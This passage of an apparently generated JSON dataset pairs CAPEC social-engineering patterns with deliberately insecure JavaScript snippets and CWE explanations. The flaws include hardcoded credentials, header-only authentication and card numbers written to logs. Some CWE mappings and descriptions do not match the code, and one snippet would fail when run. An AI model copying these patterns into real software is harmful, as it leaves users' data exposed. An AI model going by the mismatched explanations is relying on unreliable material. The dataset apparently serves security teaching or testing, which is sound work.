        "description": "This JavaScript code snippet creates an HTTP server that logs incoming requests to a file named 'server.log'. The log includes the client's IP address and the timestamp of the request. The server also has a simple authentication mechanism for accessing the '/admin' page, which checks for a specific header value ('x-auth' with value 'secret-token'). If the header is not present or incorrect, the server responds with a '403 Forbidden' status. This code embodies the main idea of CAPEC-407 (Social Information Gathering via Pretexting) by demonstrating how an attacker could gather information through server logs. The related CWEs (e.g., CWE-532) are represented by the potential exposure of sensitive information through log files, and CWE-287 is represented by the simplistic and easily bypassable authentication mechanism."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\napp.post('/customer-service', (req, res) => {\n  const { customerId, creditCardNumber } = req.body;\n  \n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (!req.headers['x-auth-token']) {\n    return res.status(401).send('Unauthorized');\n  }\n\n  // CWE-300: Channel Accessible by Non-Endpoint\n  if (req.headers['x-auth-token'] !== 'expected-token') {\n    return res.status(403).send('Forbidden');\n  }\n\n  // CWE-408: Incorrect Behavior Order: Early Amplification\n  if (!customerId) {\n    return res.status(400).send('Bad Request');\n  }\n\n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  if (req.headers['x-auth-token'] === 'expected-token') {\n    console.log(`Customer ID: ${customerId}, Credit Card Number: ${creditCardNumber}`);\n  }\n\n  res.send('Request processed');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server that handles POST requests to a '/customer-service' endpoint. The code demonstrates several security weaknesses related to the CAPEC 'Pretexting via Customer Service' and the associated CWEs:\n\n1. **CWE-940: Improper Verification of Source of a Communication Channel** - The code checks for an 'x-auth-token' header but does not verify its authenticity properly.\n2. **CWE-300: Channel Accessible by Non-Endpoint** - The code checks if the 'x-auth-token' matches an expected value but does not ensure the integrity of the communication channel.\n3. **CWE-408: Incorrect Behavior Order: Early Amplification** - The code processes the request and logs sensitive information before fully verifying the request's authenticity.\n4. **CWE-200: Exposure of Sensitive Information to an Unauthorized Actor** - The code logs sensitive information (credit card number) without ensuring the request is from an authorized actor.\n\nThis code snippet embodies the main idea of the CAPEC by simulating a scenario where an adversary could exploit these weaknesses to solicit sensitive information from a target, assuming the role of customer service."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate tech support pretexting attack\nfunction handleTechSupportRequest(userInput) {\n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  const sensitiveInfo = 'UserPassword123';\n  if (userInput === 'password') {\n    console.log(`Sensitive Information Exposed: ${sensitiveInfo}`);\n  }\n\n  // CWE-434: Unrestricted Upload of File with Dangerous Type\n  const uploadFile = (filePath) => {\n    const fileType = path.extname(filePath);\n    if (fileType === '.exe') {\n      console.log('Dangerous file type uploaded!');\n      // Simulate execution of malicious payload\n      fs.writeFileSync('/tmp/malicious.exe', 'malicious content');\n    }\n  };\n  uploadFile(userInput);\n\n  // CWE-1263: Improper Physical Access Control\n  const physicalAccess = true; // Simulate physical access\n  if (physicalAccess) {\n    console.log('Physical access granted. Sensitive data compromised.');\n  }\n}\n\n// Simulate a tech support request with user input\nhandleTechSupportRequest('password');\nhandleTechSupportRequest('malicious.exe');",
        "description": "This JavaScript code snippet simulates a tech support pretexting attack, embodying the main idea of CAPEC-Pretexting via Tech Support. The function `handleTechSupportRequest` takes user input and demonstrates several related CWEs:\n\n1. CWE-200: Exposure of Sensitive Information to an Unauthorized Actor - The code exposes a sensitive password when the user input matches 'password'.\n2. CWE-434: Unrestricted Upload of File with Dangerous Type - The code allows the upload of a dangerous file type ('.exe') and simulates the execution of a malicious payload.\n3. CWE-1263: Improper Physical Access Control - The code simulates a scenario where physical access is granted, leading to the compromise of sensitive data.\n\nThis snippet highlights the risks associated with social engineering attacks where an adversary impersonates tech support to gain unauthorized access to sensitive information or systems."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/deliver') {\n    // CWE-941: Incorrectly Specified Destination in a Communication Channel\n    const destination = req.headers['x-destination'];\n    if (!destination) {\n      res.writeHead(400, {'Content-Type': 'text/plain'});\n      res.end('Bad Request: Missing destination header');\n      return;\n    }\n\n    // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n    const sensitiveInfo = 'Sensitive Data';\n    fs.writeFileSync('/public/delivery.txt', sensitiveInfo);\n\n    // CWE-300: Channel Accessible by Non-Endpoint\n    if (req.headers['x-identity'] !== 'trusted-delivery-person') {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Forbidden: Untrusted identity');\n      return;\n    }\n\n    // CWE-433: Unparsed Raw Web Content Delivery\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Delivery successful');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for requests on port 8080. When a request is made to the '/deliver' endpoint, the server performs several checks and actions that embody the vulnerabilities described in the CAPEC and related CWEs:\n\n1. **CWE-941: Incorrectly Specified Destination in a Communication Channel** - The server checks for a 'x-destination' header in the request. If it's missing, it responds with a '400 Bad Request' status.\n\n2. **CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory** - The server writes sensitive information to a publicly accessible file '/public/delivery.txt'.\n\n3. **CWE-300: Channel Accessible by Non-Endpoint** - The server checks the 'x-identity' header to ensure the request is from a 'trusted-delivery-person'. If not, it responds with a '403 Forbidden' status.\n\n4. **CWE-433: Unparsed Raw Web Content Delivery** - The server responds with a plain text message 'Delivery successful' without parsing or validating the content.\n\nThis code represents the main idea of the CAPEC by simulating a scenario where an adversary impersonates a delivery person to manipulate the server into performing actions that could lead to information disclosure or unauthorized access."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const { headers, method, url } = req;\n  let body = [];\n\n  req.on('data', (chunk) => {\n    body.push(chunk);\n  }).on('end', () => {\n    body = Buffer.concat(body).toString();\n\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    if (url === '/getSensitiveInfo' && method === 'POST') {\n      // CWE-300: Channel Accessible by Non-Endpoint\n      // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n      res.writeHead(200, { 'Content-Type': 'application/json' });\n      res.end(JSON.stringify({ sensitiveInfo: 'This is sensitive information' }));\n    } else {\n      res.writeHead(404, { 'Content-Type': 'text/plain' });\n      res.end('Not Found');\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. The server does not properly verify the source of the communication channel (CWE-940) and exposes sensitive information to unauthorized actors (CWE-200). When a POST request is made to the '/getSensitiveInfo' endpoint, the server responds with sensitive information without verifying the identity of the requester. This represents the main idea of the CAPEC 'Pretexting via Phone', where an adversary can solicit sensitive information by assuming a trusted role, exploiting the lack of proper verification and channel security (CWE-300)."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "const sensitiveData = 'user_password';\n\nfunction handleRequest(request) {\n  if (request.userRole === 'admin') {\n    console.log('Admin access granted.');\n    return sensitiveData;\n  } else if (request.userRole === 'user' && request.queryCount < 5) {\n    console.log('User access granted.');\n    request.queryCount++;\n    return 'partial_data';\n  } else {\n    console.log('Access denied.');\n    return 'error';\n  }\n}\n\n// Simulating a social engineering attack\nconst attackerRequest = { userRole: 'user', queryCount: 0 };\nfor (let i = 0; i < 5; i++) {\n  console.log(handleRequest(attackerRequest));\n}\n\n// Attacker now pretends to be admin\nattackerRequest.userRole = 'admin';\nconsole.log(handleRequest(attackerRequest));",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker manipulates human behavior to gain unauthorized access to sensitive information. The `handleRequest` function checks the user's role and the number of queries made. Initially, the attacker makes multiple requests as a regular user to gather partial data. After reaching the query limit, the attacker then pretends to be an admin to gain full access to the sensitive data. This code embodies the CAPEC idea of manipulating human behavior to solicit information and highlights related CWEs such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) and 'Improper Control of Interaction Frequency' (CWE-799)."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "const users = { 'admin': 'password123' }; // CWE-656: Security through obscurity\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    console.log('Authentication successful');\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\nfunction performSensitiveAction(username, password) {\n  if (authenticate(username, password)) {\n    console.log('Sensitive action performed');\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// CWE-654: Reliance on a single factor (password) for authentication\n// CWE-205: Observable behavioral discrepancy in authentication messages\n// CWE-222: Truncation of security-relevant information in logs\n\n// Example of social engineering attack\nconst attacker = { 'username': 'admin', 'password': 'password123' };\nperformSensitiveAction(attacker.username, attacker.password);",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that relies on a single factor (username and password) for access control, embodying the CAPEC concept of 'Influence Perception' through social engineering. The code uses a hardcoded password for the 'admin' user (CWE-656: Reliance on Security Through Obscurity). The `authenticate` function checks the provided credentials against the hardcoded values and logs success or failure messages, which can be observed by unauthorized actors (CWE-205: Observable Behavioral Discrepancy). The `performSensitiveAction` function attempts to perform a sensitive action based on the authentication result, relying solely on the password (CWE-654: Reliance on a Single Factor in a Security Decision). The example demonstrates how an attacker with knowledge of the hardcoded password can perform a sensitive action by exploiting the weak authentication mechanism."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const userAgent = req.headers['user-agent'];\n  if (userAgent) {\n    console.log(`Received request from: ${userAgent}`);\n    // Compliment the user agent to create a sense of trust\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Wow, your browser (${userAgent}) is really up-to-date! Can you tell us your username for a better experience?`);\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Bad Request');\n  }\n});\n\nserver.listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. When a request is received, it checks for the 'User-Agent' header. If the header is present, it logs the user agent and sends a response that compliments the user's browser. This is a social engineering technique to create a sense of trust and obligation, encouraging the user to provide their username. This embodies the CAPEC 'Influence Perception of Reciprocation' by using a compliment to elicit sensitive information. The code also demonstrates CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the origin of the request, CWE-300 (Channel Accessible by Non-Endpoint) by not ensuring the integrity of the communication channel, and CWE-222 (Truncation of Security-relevant Information) by potentially truncating the user agent string."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "const crypto = require('crypto');\n\nfunction negotiateAlgorithm(clientPreference) {\n  const serverAlgorithms = ['AES-256', 'AES-128', 'DES'];\n  let selectedAlgorithm = 'DES'; // Default to less secure algorithm\n\n  if (serverAlgorithms.includes(clientPreference)) {\n    selectedAlgorithm = clientPreference;\n  }\n\n  console.log(`Selected Algorithm: ${selectedAlgorithm}`);\n  return selectedAlgorithm;\n}\n\nfunction sendMessage(destination, message) {\n  const validDestinations = ['https://trustedserver.com', 'https://backupserver.com'];\n\n  if (!validDestinations.includes(destination)) {\n    console.error('Error: Incorrectly specified destination');\n    return;\n  }\n\n  // Simulate sending a message\n  console.log(`Message sent to ${destination}: ${message}`);\n}\n\n// Example usage\nconst clientAlgorithm = 'AES-128';\nconst selectedAlgorithm = negotiateAlgorithm(clientAlgorithm);\nsendMessage('https://maliciousserver.com', 'Sensitive Data');",
        "description": "This JavaScript code snippet demonstrates vulnerabilities related to the deprecated CAPEC 'Target Influence via Perception of Concession' and associated CWEs. The `negotiateAlgorithm` function simulates an algorithm negotiation process where a less secure algorithm ('DES') is selected by default, representing CWE-757 (Algorithm Downgrade). The `sendMessage` function checks if the destination is valid but logs an error if it is not, representing CWE-941 (Incorrectly Specified Destination). The code also implicitly demonstrates CWE-205 and CWE-203 by logging observable discrepancies in the algorithm selection and destination validation processes. This snippet highlights how improper handling of algorithm negotiation and destination validation can lead to security vulnerabilities."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "const itemsInStock = 5;\n\nfunction checkStock(item) {\n  if (itemsInStock <= 0) {\n    console.log('Item is out of stock!');\n    return false;\n  }\n  return true;\n}\n\nfunction purchaseItem(item) {\n  if (checkStock(item)) {\n    console.log('Hurry! Only ' + itemsInStock + ' left in stock!');\n    // Simulate purchase process\n    itemsInStock--;\n    console.log('Purchase successful!');\n  } else {\n    console.log('Purchase failed. Item is out of stock.');\n  }\n}\n\n// Simulate user action\npurchaseItem('Widget');",
        "description": "This JavaScript code snippet simulates a simple e-commerce scenario where an adversary leverages the perception of scarcity to influence a user's purchasing decision. The `checkStock` function checks if an item is in stock, and the `purchaseItem` function uses this information to create a sense of urgency by displaying a message that only a few items are left in stock. This can persuade the user to make a purchase quickly. The code also demonstrates CWE-654 (Reliance on a Single Factor in a Security Decision) by relying solely on the `itemsInStock` variable to determine stock status, CWE-405 (Asymmetric Resource Consumption) by not properly controlling the stock decrement, and CWE-656 (Reliance on Security Through Obscurity) by not securing the stock count from being manipulated."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const { headers } = req;\n  if (headers['x-admin-auth'] === 'admin123') { // CWE-654: Reliance on a Single Factor in a Security Decision\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end('Access granted to sensitive information');\n  } else {\n    res.writeHead(403, { 'Content-Type': 'text/plain' });\n    res.end('Access denied');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});\n\n// Simulate an attacker impersonating an admin\nconst options = {\n  hostname: '127.0.0.1',\n  port: 3000,\n  path: '/',\n  method: 'GET',\n  headers: {\n    'x-admin-auth': 'admin123' // CWE-940: Improper Verification of Source of a Communication Channel\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log(data); // Should print 'Access granted to sensitive information'\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a simple HTTP server that grants access to sensitive information based on a single header value ('x-admin-auth'). This represents CWE-654 (Reliance on a Single Factor in a Security Decision). An attacker can easily impersonate an admin by including the correct header value in their request, demonstrating CWE-940 (Improper Verification of Source of a Communication Channel). The code embodies the main idea of the CAPEC by showing how an adversary can influence the perception of authority (impersonating an admin) to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "const express = require('express');\nconst app = express();\nlet requestCount = 0;\n\napp.use((req, res, next) => {\n  requestCount++;\n  if (requestCount > 100) {\n    return res.status(429).send('Too many requests');\n  }\n  next();\n});\n\napp.post('/minor-task', (req, res) => {\n  // Simulate a minor task\n  res.send('Minor task completed');\n});\n\napp.post('/major-task', (req, res) => {\n  // Simulate a major task\n  res.send('Major task completed');\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This code snippet sets up an Express.js server that tracks the number of incoming requests. It limits the number of requests to 100 to prevent abuse (CWE-799). The server has two endpoints: '/minor-task' and '/major-task'. The idea is that an adversary could use social engineering to convince a user to perform a minor task first, making them more likely to perform a major task later (CAPEC-Influence Perception of Commitment and Consistency). The code also demonstrates potential vulnerabilities such as improper verification of the source of a communication channel (CWE-940) and observable discrepancies (CWE-203) by not differentiating between authorized and unauthorized requests."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\nlet users = {};\n\napp.use(express.json());\n\n// CWE-654: Reliance on a Single Factor in a Security Decision\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    // CWE-301: Reflection Attack in an Authentication Protocol\n    res.send(`Welcome back, ${username}!`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// CWE-927: Use of Implicit Intent for Sensitive Communication\napp.post('/sendData', (req, res) => {\n  const { data } = req.body;\n  // Simulate sending data to another application\n  console.log(`Sending data: ${data}`);\n  res.send('Data sent');\n});\n\n// CWE-656: Reliance on Security Through Obscurity\napp.get('/secret', (req, res) => {\n  const secret = 'ThisIsASecret';\n  res.send(`The secret is: ${secret}`);\n});\n\n// CWE-205: Observable Behavioral Discrepancy\napp.get('/status', (req, res) => {\n  if (Math.random() > 0.5) {\n    res.send('System is up');\n  } else {\n    res.send('System is down');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}`);\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server that embodies the main idea of the CAPEC 'Influence Perception of Liking' by demonstrating how an adversary might exploit various security weaknesses to build a relationship with the target. The code includes:\n\n1. CWE-654: Reliance on a Single Factor in a Security Decision - The login endpoint relies solely on username and password for authentication.\n2. CWE-301: Reflection Attack in an Authentication Protocol - The login response reflects the username back to the user, which could be exploited in a reflection attack.\n3. CWE-927: Use of Implicit Intent for Sensitive Communication - The sendData endpoint simulates sending sensitive data to another application without proper security measures.\n4. CWE-656: Reliance on Security Through Obscurity - The secret endpoint exposes a hardcoded secret, relying on obscurity for security.\n5. CWE-205: Observable Behavioral Discrepancy - The status endpoint returns different responses based on a random condition, which could reveal internal state information to an attacker.\n\nThe code demonstrates how an adversary might use these weaknesses to build trust and influence the target's actions."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "const users = ['user1', 'user2', 'user3'];\nlet currentUser = 'user4';\n\nfunction checkUserBehavior(user) {\n  if (users.includes(user)) {\n    console.log('User behavior is normal.');\n    return true;\n  } else {\n    console.log('User behavior is suspicious.');\n    return false;\n  }\n}\n\nfunction authenticate(user) {\n  if (checkUserBehavior(user)) {\n    console.log('Access granted.');\n  } else {\n    console.log('Access denied.');\n  }\n}\n\n// Simulate an attacker influencing the target's behavior\ncurrentUser = 'user1'; // Attacker convinces the target to behave like 'user1'\nauthenticate(currentUser);",
        "description": "This JavaScript code snippet demonstrates the concept of 'Influence Perception of Consensus or Social Proof' by simulating a scenario where an attacker influences a target to adopt a behavior that is advantageous to the attacker. The `checkUserBehavior` function checks if the current user is in the list of known users and logs behavior as normal or suspicious. The `authenticate` function grants or denies access based on the behavior check. The attacker convinces the target to behave like 'user1', a known user, to gain access. This example also incorporates CWE-205 and CWE-203 by showing observable discrepancies in behavior and responses, and CWE-654 by relying on a single factor (user behavior) for authentication."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "function authenticateUser(username, password) {\n  // CWE-654: Reliance on a Single Factor in a Security Decision\n  if (username === 'admin' && password === 'password123') {\n    // CWE-451: UI Misrepresentation of Critical Information\n    alert('Welcome, admin!');\n    // CWE-941: Incorrectly Specified Destination in a Communication Channel\n    fetch('https://trustedserver.com/login', {\n      method: 'POST',\n      body: JSON.stringify({ username, password })\n    })\n    .then(response => response.json())\n    .then(data => {\n      // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n      if (data.algorithm === 'weak-algo') {\n        console.log('Using a less secure algorithm for encryption.');\n      }\n      // CWE-300: Channel Accessible by Non-Endpoint\n      if (data.channel !== 'secure') {\n        console.log('Warning: Communication channel is not secure.');\n      }\n    });\n  } else {\n    alert('Invalid credentials');\n  }\n}",
        "description": "This JavaScript code snippet demonstrates a simple user authentication function that embodies the main idea of CAPEC-Target Influence via Framing. The function checks if the username and password match hardcoded values, representing CWE-654 (Reliance on a Single Factor in a Security Decision). If the credentials are correct, it displays a welcome message, which can mislead the user (CWE-451: UI Misrepresentation of Critical Information). The function then sends a login request to a server, but the destination URL could be incorrect (CWE-941: Incorrectly Specified Destination in a Communication Channel). The response handling includes a check for a weak algorithm (CWE-757: Selection of Less-Secure Algorithm During Negotiation) and an insecure communication channel (CWE-300: Channel Accessible by Non-Endpoint). This code snippet illustrates how framing techniques can be used to influence user behavior and decision-making by manipulating the context and presentation of information."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "const users = [{id: 1, name: 'Alice', balance: 100}, {id: 2, name: 'Bob', balance: 50}];\n\nfunction transferFunds(senderId, receiverId, amount) {\n  const sender = users.find(user => user.id === senderId);\n  const receiver = users.find(user => user.id === receiverId);\n\n  if (!sender || !receiver) {\n    console.log('Invalid user IDs');\n    return;\n  }\n\n  if (sender.balance < amount) {\n    console.log('Insufficient funds');\n    return;\n  }\n\n  // CWE-654: Reliance on a Single Factor in a Security Decision\n  if (amount > 0) { // Only checks if amount is positive\n    sender.balance -= amount;\n    receiver.balance += amount;\n    console.log(`Transferred ${amount} from ${sender.name} to ${receiver.name}`);\n  } else {\n    console.log('Invalid amount');\n  }\n}\n\n// Example of influence via incentives\ntransferFunds(1, 2, 20); // Alice transfers $20 to Bob",
        "description": "This JavaScript code snippet demonstrates a simple fund transfer system between users. The function `transferFunds` allows transferring money from one user to another. The code embodies the CAPEC concept of 'Influence via Incentives' by showing how an adversary might manipulate financial transactions. The function checks for valid user IDs and sufficient balance but relies on a single factor (amount > 0) for security decisions (CWE-654). This single-factor reliance can be exploited if not properly secured, representing a potential vulnerability."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "const users = [{username: 'admin', password: 'admin123'}, {username: 'user', password: 'user123'}];\n\nfunction authenticate(username, password) {\n  const user = users.find(u => u.username === username);\n  if (user && user.password === password) {\n    console.log('Authentication successful');\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\nfunction login() {\n  const username = prompt('Enter username:');\n  const password = prompt('Enter password:');\n  if (authenticate(username, password)) {\n    alert('Welcome ' + username);\n  } else {\n    alert('Invalid credentials');\n  }\n}\n\nlogin();",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to several weaknesses described in the CAPEC and related CWEs. The `authenticate` function relies on a single factor (username and password) for authentication (CWE-654). The `login` function uses `prompt` to collect user credentials, which can be influenced by external actors (CWE-673). Additionally, the code logs authentication success or failure messages, which can reveal behavioral discrepancies (CWE-205). This simplistic approach to authentication can be exploited by adversaries using psychological principles to influence user behavior, such as phishing attacks where users are tricked into providing their credentials."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const message = data.toString();\n    if (message.includes('password')) {\n      // CWE-222: Truncation of Security-relevant Information\n      const truncatedMessage = message.substring(0, 10);\n      console.log('Received sensitive data:', truncatedMessage);\n    }\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    if (message.startsWith('AUTH')) {\n      socket.write('AUTH OK');\n    }\n  });\n\n  // CWE-300: Channel Accessible by Non-Endpoint\n  socket.on('end', () => {\n    console.log('Connection closed');\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming connections and processes data received from clients. The code demonstrates several vulnerabilities related to the CAPEC 'Influence via Modes of Thinking' and the associated CWEs:\n\n1. **CWE-222: Truncation of Security-relevant Information** - The code truncates sensitive information (e.g., passwords) before logging it, which can obscure the source or nature of an attack.\n2. **CWE-940: Improper Verification of Source of a Communication Channel** - The server responds with 'AUTH OK' to any message starting with 'AUTH' without verifying the source or authenticity of the request.\n3. **CWE-300: Channel Accessible by Non-Endpoint** - The server does not adequately verify the identity of actors at both ends of the communication channel, allowing potential unauthorized access.\n\nThe code represents the main idea of the CAPEC by showing how an adversary can manipulate communication channels and exploit these vulnerabilities to influence the target and potentially gain unauthorized access or information."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "document.addEventListener('mousemove', function(event) {\n  let eyeMovement = { x: event.clientX, y: event.clientY };\n  let sensitiveInfo = 'Sensitive Data';\n  let displayElement = document.getElementById('display');\n  if (eyeMovement.x > 100 && eyeMovement.y > 100) {\n    displayElement.innerText = sensitiveInfo.substring(0, 5); // CWE-222: Truncation of Security-relevant Information\n  } else {\n    displayElement.innerText = '*****'; // CWE-451: UI Misrepresentation of Critical Information\n  }\n  console.log('Eye Movement Detected:', eyeMovement); // CWE-203: Observable Discrepancy\n});",
        "description": "This JavaScript code snippet listens for mouse movements, which are used as a proxy for eye movements. When the mouse moves, it captures the coordinates and uses them to determine what part of sensitive information to display. If the mouse is in a specific area, it truncates and displays part of the sensitive information (CWE-222). Otherwise, it displays masked information (CWE-451). The code also logs the eye movement data, which can be observed by unauthorized actors (CWE-203). This demonstrates how an adversary could gain information via non-verbal cues, aligning with the CAPEC description."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "const sensitiveData = 'user_password';\n\nfunction processData(input) {\n  // Simulate speculative execution vulnerability\n  let result = speculativeExecution(input);\n  if (result) {\n    console.log('Sensitive Data:', sensitiveData); // CWE-532: Logging sensitive information\n  }\n}\n\nfunction speculativeExecution(input) {\n  // Simulate transient execution vulnerability\n  let temp = 0;\n  if (input > 0) {\n    temp = sensitiveData.length; // CWE-1420: Exposure of sensitive information during transient execution\n  }\n  return temp > 0;\n}\n\n// Simulate excessive attack surface by exposing function to global scope\nwindow.processData = processData; // CWE-1125: Excessive attack surface\n\n// Example usage\nprocessData(1);",
        "description": "This JavaScript code snippet demonstrates a speculative execution vulnerability where sensitive data (e.g., a user's password) can be exposed. The `processData` function simulates speculative execution by calling `speculativeExecution`, which transiently accesses the length of sensitive data based on an input condition. If the condition is met, the sensitive data is logged to the console, representing CWE-532 (logging sensitive information). The function is exposed to the global scope, increasing the attack surface (CWE-1125). This snippet embodies the deprecated CAPEC pattern of 'Target Influence via Micro-Expressions' by illustrating how transient execution can lead to information exposure."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n    const query = req.query.q;\n    try {\n        // CWE-1286: No validation of input syntax\n        if (!query.match(/^[a-zA-Z0-9 ]+$/)) {\n            throw new Error('Invalid input');\n        }\n        // CWE-1336: Improper neutralization in template engine\n        const result = `<div>Search results for: ${query}</div>`;\n        res.send(result);\n    } catch (err) {\n        // CWE-81: Improper neutralization of script in error message\n        // CWE-209: Error message contains sensitive information\n        res.status(500).send(`Error: ${err.message}`);\n    }\n});\n\n// CWE-1125: Excessive attack surface\napp.listen(3000, () => console.log('Server running on port 3000'));\n",
        "description": "This JavaScript code snippet represents a vulnerable Express.js application. The main idea is to demonstrate how improper validation and neutralization of input can lead to security vulnerabilities. The code does not validate the syntactic correctness of the input (CWE-1286), improperly neutralizes special elements in a template engine (CWE-1336), and generates error messages that may contain sensitive information (CWE-209). Additionally, it does not neutralize special characters in error messages (CWE-81) and exposes an excessive attack surface by running a server on port 3000 (CWE-1125)."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\napp.post('/process', (req, res) => {\n  const userInput = req.body.input;\n  // CWE-1286: Improper Validation of Syntactic Correctness of Input\n  if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n    return res.status(400).send('Invalid input');\n  }\n  // CWE-149: Improper Neutralization of Quoting Syntax\n  const sanitizedInput = userInput.replace(/['\"`]/g, '');\n  // CWE-804: Guessable CAPTCHA\n  const captcha = req.body.captcha;\n  if (captcha !== '1234') { // Weak CAPTCHA validation\n    return res.status(400).send('Invalid CAPTCHA');\n  }\n  // Process the sanitized input\n  res.send(`Processed input: ${sanitizedInput}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server that processes user input. It demonstrates several security weaknesses related to the deprecated CAPEC 'Target Influence via Voice in NLP' and the associated CWEs. The code includes improper validation of input syntax (CWE-1286) by only checking for alphanumeric characters, improper neutralization of quoting syntax (CWE-149) by removing quotes without proper context, and a guessable CAPTCHA (CWE-804) by using a static and easily guessable CAPTCHA value. These vulnerabilities can lead to various security issues, such as injection attacks and automated abuse of the CAPTCHA system."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  console.log('Connected');\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  client.write('SensitiveData123');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // CWE-120: Buffer Copy without Checking Size of Input\n  let buffer = Buffer.alloc(10);\n  data.copy(buffer);\n  console.log('Processed: ' + buffer.toString());\n  client.destroy();\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
